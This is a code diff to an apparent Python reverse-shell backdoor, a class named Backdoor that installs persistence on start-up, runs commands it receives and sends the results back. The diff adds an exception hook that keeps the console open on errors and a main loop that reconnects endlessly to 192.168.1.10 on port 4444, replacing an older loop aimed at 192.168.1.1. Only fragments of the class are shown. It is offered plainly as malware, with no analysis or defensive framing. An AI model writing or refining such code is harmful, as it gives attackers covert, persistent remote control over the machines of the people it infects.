@@ -10,6 +10,18 @@ import sys
 import shutil
 import time
 
+class Error_handler:
+    import traceback
+    import sys
+    def show_exception_and_exit(self, exc_type, exc_value, tb):
+        self.traceback.print_exception(exc_type, exc_value, tb)
+        input("Press Enter to exit.")
+        self.sys.exit(-1)
+    def execute(self):
+        self.sys.excepthook = self.show_exception_and_exit
+
+Error_handler().execute()
+
 class Backdoor:
     def __init__(self, ip, port ):
         self.persistence()
@@ -92,11 +104,12 @@ class Backdoor:
             except TypeError:
                 cmd_result = cmd_result.decode()
                 self.send(cmd_result)
+def main():
+    while True:
+        try:
+            backdoor = Backdoor("192.168.1.10", 4444)
+            backdoor.execute()
+        except ConnectionRefusedError:
+            continue
+main()
 
-while True:
-    try:
-        backdoor = Backdoor("192.168.1.1", 4444)
-        backdoor.execute()
-    except socket.error:
-        time.sleep(10)
-        continue
